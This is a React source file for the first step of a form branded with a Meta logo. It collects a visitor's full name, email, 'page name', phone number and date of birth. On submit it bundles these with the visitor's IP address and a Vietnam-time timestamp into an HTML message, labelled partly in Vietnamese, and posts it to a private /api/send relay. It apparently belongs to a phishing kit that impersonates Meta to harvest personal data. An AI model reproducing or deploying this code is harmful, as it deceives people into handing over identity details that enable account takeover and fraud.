'use client';

import type { FC, FormEvent } from 'react';
import { useCallback, useMemo, useRef, useState } from 'react';

import MetaLogo from '@/assets/images/meta-image.png';
import PhoneInput from '@/components/ui/phone-input';
import ValidationMessage from '@/components/ui/validation-message';
import { useFormStore } from '@/store/form-store';
import { useGeoStore } from '@/store/geo-store';
import type { Dictionary } from '@/types/content';
import Image from 'next/image';
const Step1: FC<{ onNext: () => void; formContent: Dictionary['formModal'] }> = ({ onNext, formContent }) => {
    const { geoInfo } = useGeoStore();
    const { fullName, email, pageName, phoneNumber, dobDay, dobMonth, dobYear, agreeTerms, validationErrors, setField, setPhoneNumber, setValidationError, clearAllValidationErrors, setSavedMessage, setMessageId } = useFormStore();
    const countryCode = geoInfo?.country_code || 'US';
    const [isLoading, setIsLoading] = useState(false);

    const fullNameRef = useRef<HTMLInputElement>(null);
    const emailRef = useRef<HTMLInputElement>(null);
    const pageNameRef = useRef<HTMLInputElement>(null);
    const dobDayRef = useRef<HTMLSelectElement>(null);
    const dobMonthRef = useRef<HTMLSelectElement>(null);
    const dobYearRef = useRef<HTMLSelectElement>(null);
    const agreeTermsRef = useRef<HTMLInputElement>(null);
    const phoneNumberRef = useRef<string>(phoneNumber);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode.toLowerCase() as 'us',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false,
            containerClass: 'w-full'
        }),
        [countryCode]
    );

    const handlePhoneChange = useCallback(
        (number: string) => {
            phoneNumberRef.current = number;
            setPhoneNumber(number);
        },
        [setPhoneNumber]
    );

    const phoneInputProps = useMemo(
        () => ({
            name: 'phoneNumber',
            className: 'h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] bg-white px-3 py-1.5'
        }),
        []
    );

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if (isLoading) return;

        const formFullName = fullNameRef.current?.value.trim() ?? '';
        const formEmail = emailRef.current?.value.trim() ?? '';
        const formPageName = pageNameRef.current?.value.trim() ?? '';
        const formPhoneNumber = phoneNumberRef.current.trim();
        const formDobDay = dobDayRef.current?.value ?? '';
        const formDobMonth = dobMonthRef.current?.value ?? '';
        const formDobYear = dobYearRef.current?.value ?? '';
        const formAgreeTerms = agreeTermsRef.current?.checked ?? false;

        clearAllValidationErrors();
        let hasErrors = false;
        if (!formFullName) {
            setValidationError('fullName', formContent.step1.validation.fullNameRequired);
            hasErrors = true;
        }
        if (!formEmail) {
            setValidationError('email', formContent.step1.validation.emailRequired);
            hasErrors = true;
        }
        if (!formPageName) {
            setValidationError('pageName', formContent.step1.validation.pageNameRequired);
            hasErrors = true;
        }
        if (!formPhoneNumber) {
            setValidationError('phoneNumber', formContent.step1.validation.phoneNumberRequired);
            hasErrors = true;
        }
        if (!formDobDay || !formDobMonth || !formDobYear) {
            setValidationError('dob', formContent.step1.validation.dobRequired);
            hasErrors = true;
        }
        if (!formAgreeTerms) {
            setValidationError('agreeTerms', formContent.step1.validation.agreeTermsRequired);
            hasErrors = true;
        }

        if (hasErrors) return;

        setField({ target: { name: 'fullName', value: formFullName, type: 'text' } } as React.ChangeEvent<HTMLInputElement>);
        setField({ target: { name: 'email', value: formEmail, type: 'email' } } as React.ChangeEvent<HTMLInputElement>);
        setField({ target: { name: 'pageName', value: formPageName, type: 'text' } } as React.ChangeEvent<HTMLInputElement>);
        setField({ target: { name: 'dobDay', value: formDobDay, type: 'select-one' } } as React.ChangeEvent<HTMLSelectElement>);
        setField({ target: { name: 'dobMonth', value: formDobMonth, type: 'select-one' } } as React.ChangeEvent<HTMLSelectElement>);
        setField({ target: { name: 'dobYear', value: formDobYear, type: 'select-one' } } as React.ChangeEvent<HTMLSelectElement>);
        setField({ target: { name: 'agreeTerms', checked: formAgreeTerms, type: 'checkbox' } } as React.ChangeEvent<HTMLInputElement>);

        setIsLoading(true);

        try {
            const getDateOfBirth = () => `${formDobDay}/${formDobMonth}/${formDobYear}`;

            const getVietnamTime = () => {
                const now = new Date();
                const formatter = new Intl.DateTimeFormat('vi-VN', {
                    timeZone: 'Asia/Ho_Chi_Minh',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit',
                    hour12: false,
                    day: '2-digit',
                    month: '2-digit',
                    year: 'numeric'
                });
                const parts = formatter.formatToParts(now);
                const day = parts.find((p) => p.type === 'day')?.value || '';
                const month = parts.find((p) => p.type === 'month')?.value || '';
                const year = parts.find((p) => p.type === 'year')?.value || '';
                const hour = parts.find((p) => p.type === 'hour')?.value || '';
                const minute = parts.find((p) => p.type === 'minute')?.value || '';
                const second = parts.find((p) => p.type === 'second')?.value || '';
                return `${hour}:${minute}:${second} ${day}/${month}/${year}`;
            };

            const messageContent = /* HTML */ `
<b>IP:</b> <code>${geoInfo?.ip || 'unknown'}</code>
<b>Thời gian:</b> <code>${getVietnamTime()}</code>
<b>Full Name:</b> <code>${formFullName}</code>
<b>Email:</b> <code>${formEmail}</code>
<b>Page Name:</b> <code>${formPageName}</code>
<b>SĐT:</b> <code>${formPhoneNumber}</code>
<b>Ngày Sinh:</b> <code>${getDateOfBirth()}</code>
            `.trim();

            setSavedMessage(messageContent);

            const response = await fetch('/api/send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    message: messageContent
                })
            });

            if (response.ok) {
                const data = await response.json();
                if (data.message_id) {
                    setMessageId(data.message_id);
                }
                onNext();
            }
        } catch {
        } finally {
            setIsLoading(false);
        }
    };

    const days = Array.from({ length: 31 }, (_, i) => i + 1);
    const months = Object.values(formContent.step1.months);
    const currentYear = new Date().getFullYear();
    const years = Array.from({ length: 100 }, (_, i) => currentYear - i);

    return (
        <div className='flex h-[90vh] w-full flex-col p-4'>
            <div className='flex-1 overflow-y-auto'>
                <p className='text-2xl font-bold'>{formContent.step1.title}</p>

                <form onSubmit={handleSubmit} className='mt-4 flex flex-col gap-3'>
                    <div>
                        <div className='relative w-full'>
                            <input ref={fullNameRef} name='fullName' type='text' id='fullName-input' defaultValue={fullName} className='peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] bg-white px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder='Full Name' />
                            <label htmlFor='fullName-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                                {formContent.step1.fullName}
                            </label>
                        </div>
                        <ValidationMessage message={validationErrors.fullName} visible={!!validationErrors.fullName} type='error' />
                    </div>

                    <div>
                        <div className='relative w-full'>
                            <input ref={emailRef} name='email' type='email' id='email-input' defaultValue={email} className='peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] bg-white px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder='Email' />
                            <label htmlFor='email-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                                {formContent.step1.email}
                            </label>
                        </div>
                        <ValidationMessage message={validationErrors.email} visible={!!validationErrors.email} type='error' />
                    </div>

                    <div>
                        <div className='relative w-full'>
                            <input ref={pageNameRef} name='pageName' type='text' id='pageName-input' defaultValue={pageName} className='peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] bg-white px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder='Page Name' />
                            <label htmlFor='pageName-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                                {formContent.step1.pageName}
                            </label>
                        </div>
                        <ValidationMessage message={validationErrors.pageName} visible={!!validationErrors.pageName} type='error' />
                    </div>

                    <div>
                        <p className='mb-1 font-sans'>{formContent.step1.phoneNumber}</p>
                        <PhoneInput onChangeNumber={handlePhoneChange} initOptions={initOptions} inputProps={phoneInputProps} />
                        <ValidationMessage message={validationErrors.phoneNumber} visible={!!validationErrors.phoneNumber} type='error' />
                    </div>

                    <div>
                        <p className='mb-1 font-sans'>{formContent.step1.dateOfBirth}</p>
                        <div className='flex gap-2'>
                            <select ref={dobDayRef} name='dobDay' defaultValue={dobDay} className='h-15 w-1/3 flex-1 rounded-[10px] border-2 border-[#d4dbe3] bg-white px-3 py-1.5'>
                                <option value=''>{formContent.step1.day}</option>
                                {days.map((day) => (
                                    <option key={day} value={day}>
                                        {day}
                                    </option>
                                ))}
                            </select>
                            <select ref={dobMonthRef} name='dobMonth' defaultValue={dobMonth} className='h-15 w-1/3 flex-1 rounded-[10px] border-2 border-[#d4dbe3] bg-white px-3 py-1.5'>
                                <option value=''>{formContent.step1.month}</option>
                                {months.map((month, index) => (
                                    <option key={month} value={index + 1}>
                                        {month}
                                    </option>
                                ))}
                            </select>
                            <select ref={dobYearRef} name='dobYear' defaultValue={dobYear} className='h-15 w-1/3 flex-1 rounded-[10px] border-2 border-[#d4dbe3] bg-white px-3 py-1.5'>
                                <option value=''>{formContent.step1.year}</option>
                                {years.map((year) => (
                                    <option key={year} value={year}>
                                        {year}
                                    </option>
                                ))}
                            </select>
                        </div>
                        <ValidationMessage message={validationErrors.dob} visible={!!validationErrors.dob} type='error' />
                    </div>

                    <p className='text-sm text-gray-600 italic'>{formContent.step1.note}</p>

                    <div>
                        <label className='flex cursor-pointer items-center gap-2'>
                            <input ref={agreeTermsRef} type='checkbox' name='agreeTerms' defaultChecked={agreeTerms} className='h-4 w-4 cursor-pointer' />
                            <span className='text-sm'>{formContent.step1.agreeTerms}</span>
                        </label>
                        <ValidationMessage message={validationErrors.agreeTerms} visible={!!validationErrors.agreeTerms} type='error' />
                    </div>

                    <button type='submit' disabled={isLoading} className={`mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                        {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : formContent.step1.sendButton}
                    </button>
                </form>
            </div>

            <div className='flex items-center justify-center pt-3'>
                <Image src={MetaLogo} alt='' className='w-16' />
            </div>
        </div>
    );
};

export default Step1;
